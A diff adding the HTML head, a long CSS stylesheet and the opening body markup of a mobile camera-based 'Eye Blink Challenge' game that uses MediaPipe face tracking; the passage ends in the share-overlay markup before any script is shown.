@@ -1,0 +1,2463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>👁️ Eye Blink Challenge</title>
+
+<!-- ═══════════════════════════════════════════════
+     SEO & LINK PREVIEW (WhatsApp / Instagram / Facebook / X)
+     ▸ Change og:url  →  your actual page URL
+     ▸ Change og:image → a hosted image (1200×630px recommended)
+     ═══════════════════════════════════════════════ -->
+
+<!-- Primary SEO -->
+<meta name="description"        content="How fast can you blink? Test your eye-blinking speed with beauty AR filters. Challenge your friends!">
+<meta name="theme-color" content="#ff1493">
+
+<!-- Open Graph (WhatsApp · Instagram · Facebook) -->
+<meta property="og:type"        content="website">
+<meta property="og:site_name"   content="Eye Blink Challenge">
+<meta property="og:title"       content="👁️ Eye Blink Challenge — How Fast Can You Blink?">
+<meta property="og:description" content="Test your blink speed with beauty AR filters. Can you beat the record? Play now!">
+<meta property="og:url"         content="https://eye-blink.github.io/challenge/">
+<meta property="og:image"       content="https://eye-blink.github.io/challenge/preview.jpg">
+<meta property="og:image:width" content="1731">
+<meta property="og:image:height" content="909">
+<meta property="og:image:alt"   content="Eye Blink Challenge — AR blink speed game">
+
+<!-- Twitter / X Card -->
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="👁️ Eye Blink Challenge — How Fast Can You Blink?">
+<meta name="twitter:description" content="Test your blink speed with beauty AR filters. Can you beat the record?">
+<meta name="twitter:image"       content="https://eye-blink.github.io/challenge/preview.jpg">
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Bebas+Neue&display=swap');
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:      #07000e;
+    --surface: #110018;
+    --surface2:#1a0028;
+    --border:  rgba(255, 20, 147, 0.22);
+    --accent:  #ff1493;
+    --accent2: #ff79b8;
+    --accent3: #ff4757;
+    --text:    #fff0f8;
+    --muted:   rgba(255, 240, 248, 0.45);
+    --glow:    rgba(255, 20, 147, 0.45);
+    --glow2:   rgba(255, 20, 147, 0.15);
+  }
+
+  html, body {
+    font-family: 'Space Grotesk', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    height: 100%;
+    overflow-x: hidden;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  /* ── dot halftone corners — top-left + bottom-right like preview ── */
+  body::before, body::after {
+    content: '';
+    position: fixed;
+    width: 55vw; height: 55vw;
+    background-image: radial-gradient(circle, rgba(255,20,147,0.22) 1px, transparent 1px);
+    background-size: 18px 18px;
+    pointer-events: none;
+    z-index: 0;
+  }
+  body::before {
+    top: 0; left: 0;
+    mask-image: radial-gradient(ellipse at 0% 0%, black 0%, transparent 70%);
+    -webkit-mask-image: radial-gradient(ellipse at 0% 0%, black 0%, transparent 70%);
+  }
+  body::after {
+    bottom: 0; right: 0;
+    mask-image: radial-gradient(ellipse at 100% 100%, black 0%, transparent 70%);
+    -webkit-mask-image: radial-gradient(ellipse at 100% 100%, black 0%, transparent 70%);
+  }
+
+  /* ── LAYOUT ── */
+  .phone-shell {
+    display: flex;
+    flex-direction: column;
+    min-height: 100svh;
+    max-width: 480px;
+    margin: 0 auto;
+  }
+
+  /* ── SELFIE VIEW — ~58vh ── */
+  .selfie-zone {
+    position: relative;
+    width: 100%;
+    height: 58svh;
+    background: #000;
+    flex-shrink: 0;
+    overflow: hidden;
+  }
+
+  #videoEl {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1);
+    filter: brightness(0) saturate(0);
+  }
+
+  #beautyCanvas, #overlayCanvas {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    transform: scaleX(-1);
+  }
+
+  /* pink glowing bottom edge */
+  .selfie-zone::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    border-radius: 0 0 28px 28px;
+    box-shadow:
+      inset 0 0 0 1.5px rgba(255, 20, 147, 0.25),
+      0 4px 32px rgba(255, 20, 147, 0.35);
+    pointer-events: none;
+    z-index: 5;
+  }
+
+  /* Camera viewfinder corner brackets */
+  .cam-corners {
+    position: absolute;
+    inset: 18px;
+    z-index: 9;
+    pointer-events: none;
+  }
+  .cam-corners::before,
+  .cam-corners::after {
+    content: '';
+    position: absolute;
+    width: 28px; height: 28px;
+    border-color: rgba(255, 20, 147, 0.9);
+    border-style: solid;
+  }
+  .cam-corners::before {
+    top: 0; left: 0;
+    border-width: 3px 0 0 3px;
+    border-radius: 3px 0 0 0;
+    box-shadow: -2px -2px 8px rgba(255,20,147,0.5);
+  }
+  .cam-corners::after {
+    bottom: 0; right: 0;
+    border-width: 0 3px 3px 0;
+    border-radius: 0 0 3px 0;
+    box-shadow: 2px 2px 8px rgba(255,20,147,0.5);
+  }
+
+  /* Top badges */
+  .cam-badges {
+    position: absolute;
+    top: 14px;
+    left: 14px;
+    display: flex;
+    gap: 7px;
+    z-index: 10;
+  }
+
+  .badge {
+    padding: 4px 10px;
+    border-radius: 20px;
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.6px;
+    text-transform: uppercase;
+    backdrop-filter: blur(6px);
+  }
+
+  .badge-live   { background: rgba(255,30,60,0.92); color: #fff; box-shadow: 0 0 10px rgba(255,30,60,0.5); }
+  .badge-beauty { background: rgba(255,20,147,0.92); color: #fff; box-shadow: 0 0 10px rgba(255,20,147,0.5); }
+  .badge-face   { background: rgba(255,20,147,0.25); color: #ff79b8; border: 1px solid rgba(255,20,147,0.5); }
+
+  /* Big number overlay — bottom of camera */
+  .cam-score-overlay {
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    background: linear-gradient(transparent, rgba(0,0,0,0.72));
+    padding: 40px 20px 22px;
+    text-align: center;
+    z-index: 8;
+    display: none;
+  }
+
+  .big-number {
+    font-size: 5rem;
+    font-weight: 700;
+    line-height: 1;
+    color: var(--accent);
+    font-family: 'Bebas Neue', 'Space Grotesk', sans-serif;
+    text-shadow:
+      0 0 20px rgba(255,20,147,0.9),
+      0 0 50px rgba(255,20,147,0.5),
+      0 2px 4px rgba(0,0,0,0.8);
+  }
+
+  .big-label {
+    font-size: 0.78rem;
+    color: rgba(255,240,248,0.6);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-top: 2px;
+  }
+
+  /* Countdown overlay */
+  .countdown-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(7,0,14,0.7);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 20;
+    font-size: 9rem;
+    font-weight: 700;
+    font-family: 'Bebas Neue', sans-serif;
+    color: var(--accent);
+    text-shadow:
+      0 0 30px rgba(255,20,147,1),
+      0 0 80px rgba(255,20,147,0.6);
+  }
+
+  /* Start placeholder inside camera */
+  .cam-placeholder {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 14px;
+    z-index: 6;
+    background: radial-gradient(ellipse at center, rgba(255,20,147,0.18) 0%, rgba(7,0,14,0.75) 100%);
+  }
+
+  .cam-placeholder .eye-big {
+    font-size: 4.5rem;
+    animation: eyePop 1.8s ease-in-out infinite;
+    filter: drop-shadow(0 0 20px rgba(255,20,147,0.9));
+  }
+
+  @keyframes eyePop {
+    0%, 100% { transform: scale(1); }
+    50%       { transform: scale(1.12); }
+  }
+
+  .cam-placeholder .cam-tap-btn {
+    background: linear-gradient(135deg, #ff1493, #c2006b);
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    padding: 14px 32px;
+    font-size: 1rem;
+    font-weight: 700;
+    font-family: 'Space Grotesk', sans-serif;
+    cursor: pointer;
+    box-shadow:
+      0 4px 24px rgba(255,20,147,0.7),
+      0 0 0 1px rgba(255,20,147,0.3);
+    animation: camPulse 2s infinite;
+    letter-spacing: 0.3px;
+    touch-action: manipulation;
+  }
+
+  .cam-placeholder p { color: rgba(255,240,248,0.55); font-size: 0.8rem; margin-top: -4px; }
+
+  /* Instruction text inside camera */
+  .instruction-text {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(7,0,14,0.82);
+    backdrop-filter: blur(8px);
+    padding: 16px 22px;
+    border-radius: 16px;
+    border: 1px solid rgba(255,20,147,0.3);
+    text-align: center;
+    z-index: 15;
+    display: none;
+    width: 80%;
+  }
+  .instruction-text h2 { font-size: 1.3rem; color: var(--accent); margin-bottom: 6px; }
+  .instruction-text p  { color: rgba(255,240,248,0.8); font-size: 0.88rem; line-height: 1.5; }
+
+  /* Flash */
+  @keyframes flash {
+    0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; }
+  }
+  .photo-flash {
+    position: absolute;
+    inset: 0;
+    background: #fff;
+    z-index: 30;
+    pointer-events: none;
+    animation: flash 0.4s ease-out forwards;
+    display: none;
+    border-radius: inherit;
+  }
+
+  /* ── BOTTOM PANEL ── */
+  .bottom-panel {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    padding: 0;
+    overflow-y: scroll;
+    background: linear-gradient(180deg, #07000e 0%, #0a0012 60%, #07000e 100%);
+    cursor: pointer;
+  }
+
+  /* ── MODE PILLS ── */
+  .mode-row {
+    display: flex;
+    gap: 8px;
+    padding: 14px 16px 10px;
+    background: linear-gradient(to bottom, rgba(255,20,147,0.04), transparent);
+  }
+
+  .mode-pill {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    padding: 13px 12px;
+    border-radius: 16px;
+    border: 1.5px solid rgba(255,20,147,0.15);
+    background: rgba(17, 0, 24, 0.8);
+    color: rgba(255,240,248,0.4);
+    font-family: inherit;
+    font-size: 0.88rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.22s cubic-bezier(0.34,1.2,0.64,1);
+    touch-action: manipulation;
+    -webkit-tap-highlight-color: transparent;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .mode-pill::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, rgba(255,20,147,0.12), rgba(255,121,184,0.06));
+    opacity: 0;
+    transition: opacity 0.22s;
+    border-radius: inherit;
+  }
+
+  .mode-pill .pill-icon {
+    font-size: 1.15rem;
+    transition: transform 0.22s cubic-bezier(0.34,1.4,0.64,1);
+  }
+
+  .mode-pill.active {
+    border-color: var(--accent);
+    color: var(--text);
+    box-shadow:
+      0 0 22px rgba(255,20,147,0.4),
+      0 0 0 1px rgba(255,20,147,0.1) inset,
+      0 4px 16px rgba(0,0,0,0.4);
+  }
+
+  .mode-pill.active::before { opacity: 1; }
+  .mode-pill.active .pill-icon { transform: scale(1.18); }
+
+  .mode-pill:active { transform: scale(0.96); }
+
+  /* ── STATS STRIP ── */
+  .stats-strip {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 8px;
+    padding: 2px 16px 10px;
+  }
+
+  .stat-cell {
+    background: linear-gradient(145deg, rgba(26,0,40,0.9), rgba(17,0,24,0.95));
+    border: 1px solid rgba(255,20,147,0.18);
+    border-radius: 16px;
+    padding: 12px 8px 10px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.15s;
+  }
+
+  .stat-cell::after {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(255,20,147,0.4), transparent);
+  }
+
+  .stat-cell .s-icon {
+    font-size: 0.85rem;
+    margin-bottom: 3px;
+    display: block;
+  }
+
+  .stat-cell .s-val {
+    font-size: 1.55rem;
+    font-weight: 700;
+    font-family: 'Bebas Neue', 'Space Grotesk', sans-serif;
+    line-height: 1;
+    transition: transform 0.1s;
+  }
+
+  .stat-cell .s-val.pop {
+    animation: statPop 0.25s cubic-bezier(0.34,1.6,0.64,1);
+  }
+
+  @keyframes statPop {
+    0%   { transform: scale(1); }
+    50%  { transform: scale(1.22); }
+    100% { transform: scale(1); }
+  }
+
+  .stat-cell .s-val.purple {
+    color: var(--accent);
+    text-shadow: 0 0 14px rgba(255,20,147,0.7);
+  }
+  .stat-cell .s-val.green {
+    color: var(--accent2);
+    text-shadow: 0 0 14px rgba(255,121,184,0.6);
+  }
+  .stat-cell .s-val.white { color: var(--text); }
+
+  .stat-cell .s-lbl {
+    font-size: 0.6rem;
+    color: rgba(255,240,248,0.35);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-top: 4px;
+  }
+
+  /* ── EYE STATUS ROW ── */
+  .eye-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    padding: 0 16px 10px;
+  }
+
+  .eye-cell {
+    background: linear-gradient(145deg, rgba(26,0,40,0.8), rgba(17,0,24,0.9));
+    border: 1.5px solid rgba(255,20,147,0.15);
+    border-radius: 16px;
+    padding: 11px 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    transition: all 0.18s ease;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .eye-cell::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at 30% 50%, rgba(255,20,147,0.1), transparent 70%);
+    opacity: 0;
+    transition: opacity 0.18s;
+    border-radius: inherit;
+  }
+
+  .eye-cell.closed {
+    border-color: rgba(255,20,147,0.7);
+    box-shadow:
+      0 0 20px rgba(255,20,147,0.3),
+      inset 0 0 12px rgba(255,20,147,0.08);
+  }
+
+  .eye-cell.closed::before { opacity: 1; }
+
+  .eye-cell .eye-emoji {
+    font-size: 1.6rem;
+    filter: drop-shadow(0 0 6px rgba(255,20,147,0.4));
+    transition: transform 0.18s;
+  }
+
+  .eye-cell.closed .eye-emoji {
+    transform: scaleY(0.4);
+    filter: drop-shadow(0 0 10px rgba(255,20,147,0.8));
+  }
+
+  .eye-cell .eye-info .eye-name {
+    font-size: 0.65rem;
+    color: rgba(255,240,248,0.35);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+  }
+
+  .eye-cell .eye-info .eye-state {
+    font-size: 0.84rem;
+    font-weight: 700;
+    margin-top: 2px;
+    letter-spacing: 0.2px;
+  }
+
+  /* ── ACTION BUTTONS ── */
+  .action-area {
+    padding: 0 16px 12px;
+    display: flex;
+    flex-direction: column;
+    gap: 9px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 17px;
+    border-radius: 18px;
+    border: none;
+    font-family: inherit;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: all 0.2s cubic-bezier(0.34,1.2,0.64,1);
+    letter-spacing: 0.6px;
+    touch-action: manipulation;
+    text-transform: uppercase;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .btn::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+    transition: left 0.5s;
+  }
+
+  .btn:hover::after { left: 150%; }
+  .btn:active { transform: scale(0.96); }
+
+  .btn-cam {
+    background: linear-gradient(135deg, #ff1493 0%, #c2006b 100%);
+    color: #fff;
+    border: none;
+    box-shadow: 0 4px 28px rgba(255,20,147,0.55), 0 0 0 0 rgba(255,20,147,0.4);
+    animation: camPulse 2.2s infinite;
+    font-size: 1.05rem;
+  }
+
+  @keyframes camPulse {
+    0%   { box-shadow: 0 4px 28px rgba(255,20,147,0.55), 0 0 0 0 rgba(255,20,147,0.4); }
+    50%  { box-shadow: 0 4px 40px rgba(255,20,147,0.85), 0 0 0 12px rgba(255,20,147,0); }
+    100% { box-shadow: 0 4px 28px rgba(255,20,147,0.55), 0 0 0 0 rgba(255,20,147,0); }
+  }
+
+  .btn-start {
+    background: linear-gradient(135deg, #ff1493 0%, #e8007a 100%);
+    color: #fff;
+    box-shadow:
+      0 4px 28px rgba(255,20,147,0.55),
+      0 0 0 1px rgba(255,150,200,0.2) inset;
+    animation: camPulse 2.2s infinite;
+  }
+
+  .btn-stop {
+    background: linear-gradient(135deg, #ff4757 0%, #c0003a 100%);
+    color: #fff;
+    box-shadow: 0 4px 22px rgba(255,71,87,0.5);
+  }
+
+  .upload-status {
+    font-size: 0.74rem;
+    color: var(--accent2);
+    text-align: center;
+    min-height: 16px;
+    opacity: 0.75;
+  }
+
+  /* ── PHOTO GALLERY ── */
+  .gallery-section {
+    padding: 0 16px 12px;
+  }
+
+  .section-label {
+    font-size: 0.66rem;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: rgba(255,240,248,0.3);
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .section-label::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, rgba(255,20,147,0.25), transparent);
+  }
+
+  .photo-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 6px;
+  }
+
+  .photo-grid img {
+    width: 100%;
+    aspect-ratio: 1;
+    object-fit: cover;
+    border-radius: 12px;
+    border: 1px solid rgba(255,20,147,0.2);
+    cursor: pointer;
+    transition: transform 0.2s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.2s;
+  }
+
+  .photo-grid img:hover {
+    transform: scale(1.06);
+    box-shadow: 0 4px 14px rgba(255,20,147,0.35);
+  }
+
+  .photo-grid img:active { transform: scale(0.94); }
+
+  .gallery-empty {
+    color: rgba(255,240,248,0.2);
+    font-size: 0.78rem;
+    text-align: center;
+    padding: 12px 0;
+    font-style: italic;
+  }
+
+  /* ── LEADERBOARD ── */
+  .lb-section {
+    padding: 0 16px 14px;
+  }
+
+  .lb-entry {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    background: linear-gradient(135deg, rgba(26,0,40,0.85), rgba(17,0,24,0.9));
+    border: 1px solid rgba(255,20,147,0.14);
+    border-radius: 12px;
+    margin-bottom: 5px;
+    font-size: 0.85rem;
+    transition: transform 0.15s, box-shadow 0.15s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .lb-entry:first-child {
+    border-color: rgba(255,20,147,0.4);
+    box-shadow: 0 0 14px rgba(255,20,147,0.15);
+  }
+
+  .lb-entry:first-child::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, rgba(255,20,147,0.08), transparent 60%);
+    pointer-events: none;
+  }
+
+  .lb-rank  {
+    font-weight: 700;
+    color: var(--accent);
+    min-width: 26px;
+    text-shadow: 0 0 10px rgba(255,20,147,0.6);
+    font-size: 1rem;
+  }
+  .lb-name  { flex: 1; font-size: 0.88rem; font-weight: 500; }
+  .lb-score {
+    font-weight: 700;
+    color: var(--accent2);
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: 1rem;
+    letter-spacing: 0.5px;
+  }
+
+  /* ── SHARE BAR ── */
+  .share-bar {
+    margin: 0 16px 24px;
+    padding: 14px 16px;
+    background: linear-gradient(135deg, rgba(26,0,40,0.9), rgba(17,0,24,0.95));
+    border: 1px solid rgba(255,20,147,0.25);
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    box-shadow:
+      0 0 24px rgba(255,20,147,0.12),
+      0 0 0 1px rgba(255,20,147,0.05) inset;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .share-bar::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(255,20,147,0.5), transparent);
+  }
+
+  .share-bar span {
+    flex: 1;
+    color: rgba(255,20,147,0.7);
+    font-size: 0.73rem;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  .share-bar button {
+    background: linear-gradient(135deg, #ff1493, #c2006b);
+    border: none;
+    color: #fff;
+    padding: 7px 16px;
+    border-radius: 20px;
+    cursor: pointer;
+    font-size: 0.76rem;
+    font-family: inherit;
+    font-weight: 700;
+    white-space: nowrap;
+    flex-shrink: 0;
+    touch-action: manipulation;
+    box-shadow: 0 2px 12px rgba(255,20,147,0.4);
+    transition: transform 0.15s, box-shadow 0.15s;
+  }
+
+  .share-bar button:active {
+    transform: scale(0.94);
+    box-shadow: 0 1px 6px rgba(255,20,147,0.3);
+  }
+
+  /* Blink ring animation */
+  @keyframes blinkRing {
+    0%   { box-shadow: inset 0 0 0 0 rgba(255,20,147,0.8); }
+    70%  { box-shadow: inset 0 0 0 6px rgba(255,20,147,0); }
+    100% { box-shadow: inset 0 0 0 0 rgba(255,20,147,0); }
+  }
+
+  .blink-detected::after {
+    animation: blinkRing 0.4s ease-out;
+  }
+
+  /* Toast */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%) translateY(20px);
+    background: rgba(17, 0, 24, 0.96);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,20,147,0.4);
+    box-shadow: 0 0 20px rgba(255,20,147,0.2);
+    padding: 11px 22px;
+    border-radius: 40px;
+    font-size: 0.88rem;
+    opacity: 0;
+    transition: all 0.28s;
+    z-index: 999;
+    white-space: nowrap;
+    max-width: 90vw;
+    color: var(--text);
+  }
+
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ── SHARE OVERLAY inside camera ── */
+  .share-overlay {
+    position: absolute;
+    inset: 0;
+    z-index: 25;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(180deg, rgba(7,0,14,0.5) 0%, rgba(7,0,14,0.94) 100%);
+    padding: 16px;
+    animation: cardSlideIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  }
+
+  .share-overlay .so-score {
+    font-size: 5.5rem;
+    font-weight: 700;
+    font-family: 'Bebas Neue', sans-serif;
+    line-height: 1;
+    background: linear-gradient(135deg, #ff1493, #ff79b8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    filter: drop-shadow(0 0 25px rgba(255,20,147,0.8));
+  }
+
+  .share-overlay .so-unit {
+    font-size: 0.9rem;
+    color: rgba(255,240,248,0.5);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-top: 2px;
+    margin-bottom: 10px;
+  }
+
+  .share-overlay .so-tagline {
+    font-size: 0.88rem;
+    color: rgba(255,240,248,0.75);
+    text-align: center;
+    line-height: 1.5;
+    margin-bottom: 14px;
+  }
+
+  .share-overlay .so-tagline .highlight {
+    color: #fff;
+    font-weight: 700;
+    background: linear-gradient(90deg, #ff1493, #ff79b8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    font-size: 1rem;
+  }
+
+  .share-overlay .so-btns {
+    display: flex;
+    gap: 8px;
+    width: 100%;
+    max-width: 320px;
+  }
+
+  .share-overlay .so-btns button {
+    flex: 1;
+    padding: 12px 6px;
+    border-radius: 14px;
+    border: none;
+    font-family: inherit;
+    font-size: 0.78rem;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    transition: transform 0.15s;
+  }
+
+  .share-overlay .so-btns button:active { transform: scale(0.94); }
+  .share-overlay .so-btns .so-icon { font-size: 1.3rem; }
+
+  .so-btn-wa   { background: #25D366; color: #fff; box-shadow: 0 4px 14px rgba(37,211,102,0.4); }
+  .so-btn-ig   { background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: #fff; box-shadow: 0 4px 14px rgba(220,39,67,0.4); }
+  .so-btn-copy { background: rgba(255,255,255,0.12); color: #fff; border: 1px solid rgba(255,255,255,0.2) !important; }
+
+  .share-overlay .so-play-again {
+    margin-top: 10px;
+    background: none;
+    border: 1px solid rgba(255,255,255,0.2);
+    color: rgba(255,255,255,0.5);
+    padding: 8px 24px;
+    border-radius: 20px;
+    font-family: inherit;
+    font-size: 0.78rem;
+    cursor: pointer;
+  }
+  .result-card {
+    display: none;
+    margin: 0 16px 14px;
+    border-radius: 20px;
+    overflow: hidden;
+    position: relative;
+    background: linear-gradient(135deg, #1a0028, #0e0018);
+    border: 1.5px solid rgba(255,20,147,0.5);
+    box-shadow:
+      0 8px 40px rgba(255,20,147,0.3),
+      0 0 0 1px rgba(255,20,147,0.1);
+    animation: cardSlideIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  }
+
+  @keyframes cardSlideIn {
+    from { opacity: 0; transform: translateY(30px) scale(0.95); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .result-card .card-bg {
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse at 20% 50%, rgba(255,20,147,0.2) 0%, transparent 65%),
+      radial-gradient(ellipse at 90% 10%, rgba(255,121,184,0.12) 0%, transparent 55%);
+    pointer-events: none;
+  }
+
+  .result-card .card-inner {
+    position: relative;
+    padding: 20px 18px 16px;
+    z-index: 1;
+  }
+
+  .result-card .card-top {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 14px;
+  }
+
+  .result-card .card-avatar {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    border: 2px solid var(--accent);
+    box-shadow: 0 0 10px rgba(255,20,147,0.5);
+    object-fit: cover;
+    flex-shrink: 0;
+    background: var(--surface2);
+  }
+
+  .result-card .card-title-wrap { flex: 1; }
+
+  .result-card .card-title {
+    font-size: 0.78rem;
+    color: var(--accent);
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    text-shadow: 0 0 10px rgba(255,20,147,0.5);
+  }
+
+  .result-card .card-name {
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--text);
+    margin-top: 1px;
+  }
+
+  .result-card .card-score-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin: 8px 0 14px;
+    background: rgba(255,20,147,0.07);
+    border-radius: 16px;
+    padding: 14px 10px;
+    border: 1px solid rgba(255,20,147,0.2);
+  }
+
+  .result-card .big-score {
+    font-size: 3.8rem;
+    font-weight: 700;
+    font-family: 'Bebas Neue', 'Space Grotesk', sans-serif;
+    line-height: 1;
+    background: linear-gradient(135deg, #ff1493, #ff79b8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    filter: drop-shadow(0 0 12px rgba(255,20,147,0.6));
+  }
+
+  .result-card .score-unit {
+    font-size: 1rem;
+    color: var(--muted);
+    font-weight: 600;
+    align-self: flex-end;
+    padding-bottom: 8px;
+  }
+
+  .result-card .card-tagline {
+    text-align: center;
+    font-size: 0.82rem;
+    color: rgba(255,240,248,0.6);
+    margin-bottom: 14px;
+    line-height: 1.4;
+  }
+
+  .result-card .card-tagline strong {
+    color: var(--accent2);
+  }
+
+  .result-card .share-btns {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    margin-bottom: 10px;
+  }
+
+  .result-card .share-btns button {
+    padding: 11px 8px;
+    border-radius: 12px;
+    border: none;
+    font-family: inherit;
+    font-size: 0.82rem;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    transition: transform 0.15s, box-shadow 0.15s;
+  }
+
+  .result-card .share-btns button:active { transform: scale(0.96); }
+
+  .btn-whatsapp {
+    background: #25D366;
+    color: #fff;
+    box-shadow: 0 4px 14px rgba(37,211,102,0.35);
+  }
+
+  .btn-insta {
+    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    color: #fff;
+    box-shadow: 0 4px 14px rgba(220,39,67,0.35);
+  }
+
+  .btn-copy-link {
+    background: rgba(255,255,255,0.08);
+    color: var(--text);
+    border: 1px solid rgba(255,255,255,0.12) !important;
+    grid-column: span 2;
+  }
+  @media (min-width: 600px) {
+    .phone-shell { max-width: 600px; }
+    .selfie-zone { height: 62svh; }
+    .big-number { font-size: 6rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone-shell">
+
+  <!-- ── SELFIE VIEW ── -->
+  <div class="selfie-zone" id="camBox">
+    <video id="videoEl" playsinline muted autoplay></video>
+    <canvas id="beautyCanvas"></canvas>
+    <canvas id="overlayCanvas"></canvas>
+
+    <div class="cam-badges">
+      <span class="badge badge-live">● Live</span>
+      <span class="badge badge-beauty" id="beautyBadge">✨ Beauty</span>
+      <span class="badge badge-face" id="faceBadge" style="display:none">💗 Face On</span>
+    </div>
+
+    <!-- pink camera viewfinder corners -->
+    <div class="cam-corners"></div>
+
+    <div class="photo-flash" id="photoFlash"></div>
+    <div class="countdown-overlay" id="countdownOverlay"></div>
+
+    <div class="instruction-text" id="instructionText">
+      <h2 id="instrTitle">Get Ready!</h2>
+      <p id="instrBody">Look at the camera and center your face</p>
+    </div>
+
+    <div class="cam-score-overlay" id="camTimer">
+      <div class="big-number" id="bigNumber">0</div>
+      <div class="big-label" id="bigLabel">blinks</div>
+    </div>
+
+    <div class="cam-placeholder" id="startScreen">
+      <div class="eye-big">👁️</div>
+      <button class="cam-tap-btn" onclick="setupCamera()">📷 Tap to Start Camera</button>
+      <p>Allow camera to begin the challenge</p>
+    </div>
+
+    <!-- Share overlay — game khatam hone pe camera ke upar aayega -->
+    <div class="share-overlay" id="shareOverlay">
+      <div class="so-score" id="soScore">0</div>
